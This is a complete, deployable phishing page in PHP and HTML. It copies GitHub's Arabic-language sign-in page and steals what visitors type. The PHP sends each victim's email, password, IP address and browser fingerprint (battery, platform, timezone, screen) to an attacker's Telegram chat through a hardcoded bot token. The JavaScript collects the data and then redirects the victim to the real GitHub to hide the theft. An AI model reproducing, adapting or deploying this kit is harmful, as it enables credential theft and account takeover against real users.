<?php
// توكن البوت الخاص بك
$botToken = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
👤 <b>بيانات تسجيل دخول GitHub</b>

📧 <b>البريد الإلكتروني:</b> <code>{$credentials['email']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى GitHub</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #0d1117;
      color: #f0f6fc;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 340px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .github-logo {
      width: 64px;
      height: 64px;
      margin-bottom: 20px;
      fill: #f0f6fc;
    }
    
    .login-form {
      background-color: #161b22;
      border-radius: 6px;
      padding: 20px;
      border: 1px solid #30363d;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
    }
    
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 24px;
      font-weight: 300;
      color: #f0f6fc;
      letter-spacing: -0.5px;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 14px;
      color: #8b949e;
      line-height: 1.5;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #f0f6fc;
      font-weight: 400;
    }
    
    input[type="email"],
    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 12px;
      background-color: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      color: #f0f6fc;
      font-size: 14px;
      transition: border-color 0.2s;
      margin-top: 4px;
    }
    
    input[type="email"]:focus,
    input[type="password"]:focus,
    input[type="text"]:focus {
      outline: none;
      border-color: #58a6ff;
      box-shadow: 0 0 0 3px rgba(56, 139, 253, 0.15);
    }
    
    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #238636;
      color: #ffffff;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #2ea043;
    }
    
    .links {
      text-align: center;
      margin-top: 20px;
      font-size: 12px;
    }
    
    .links a {
      color: #58a6ff;
      text-decoration: none;
      display: block;
      margin: 10px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #79c0ff;
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #30363d;
      margin: 20px 0;
      position: relative;
    }
    
    .divider-text {
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #161b22;
      padding: 0 10px;
      color: #8b949e;
      font-size: 12px;
    }
    
    .signup-box {
      margin-top: 20px;
      padding: 15px;
      border: 1px solid #30363d;
      border-radius: 6px;
      text-align: center;
    }
    
    .signup-box p {
      margin-bottom: 10px;
      font-size: 14px;
      color: #8b949e;
    }
    
    .signup-btn {
      width: 100%;
      padding: 12px;
      background-color: transparent;
      color: #f0f6fc;
      border: 1px solid #30363d;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    
    .signup-btn:hover {
      background-color: #1f6feb;
      border-color: #1f6feb;
    }
    
    .footer {
      text-align: center;
      margin-top: 40px;
      color: #8b949e;
      font-size: 12px;
      line-height: 1.6;
    }
    
    .footer a {
      color: #58a6ff;
      text-decoration: none;
      margin: 0 5px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 20px;
        height: 20px;
        border: 2px solid rgba(88, 166, 255, 0.2);
        border-radius: 50%;
        border-top-color: #58a6ff;
        animation: spin 1s linear infinite;
        margin: 20px auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 10px;
        font-size: 12px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #8b949e;
    }
    
    .error-message {
      color: #f85149;
      font-size: 12px;
      margin-top: 10px;
      text-align: center;
      display: none;
    }

    .security-notice {
      background-color: #1f6feb15;
      border-radius: 6px;
      padding: 12px;
      margin-top: 20px;
      font-size: 12px;
      color: #8b949e;
      text-align: center;
      border: 1px solid #30363d;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
      font-size: 12px;
    }
    
    .checkbox-group input[type="checkbox"] {
      margin-left: 10px;
      width: 16px;
      height: 16px;
      accent-color: #238636;
    }
    
    .checkbox-group label {
      margin-bottom: 0;
      font-weight: normal;
      color: #f0f6fc;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار GitHub -->
      <svg class="github-logo" viewBox="0 0 16 16" version="1.1" width="64" height="64" aria-hidden="true">
        <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
      </svg>
    </div>
    
    <div class="login-form">
      <h1>تسجيل الدخول إلى GitHub</h1>
      
      <form id="githubLoginForm">
        <div class="input-group">
          <label for="username">اسم المستخدم أو عنوان البريد الإلكتروني</label>
          <input type="text" id="username" name="username" autocomplete="username" required autofocus>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="rememberMe" name="rememberMe">
          <label for="rememberMe">تذكرني</label>
        </div>
        
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">نسيت كلمة المرور؟</a>
          <a href="#">إنشاء حساب</a>
          <a href="#">طلب الدعم</a>
        </div>
      </form>
      
      <div class="security-notice">
        <p>لحماية حسابك، تأكد من أنك تقوم بتسجيل الدخول إلى الموقع الرسمي github.com</p>
      </div>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">خطأ في تسجيل الدخول. يرجى التحقق من بياناتك والمحاولة مرة أخرى.</div>
    </div>
    
    <div class="signup-box">
      <p>جديد على GitHub؟</p>
      <button type="button" class="signup-btn">إنشاء حساب</button>
    </div>
    
    <div class="footer">
      <a href="#">الشروط</a>
      <a href="#">الخصوصية</a>
      <a href="#">الأمان</a>
      <a href="#">اتصل بنا</a>
      <p>© 2025 GitHub, Inc. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('githubLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {email: username, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى GitHub بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://github.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
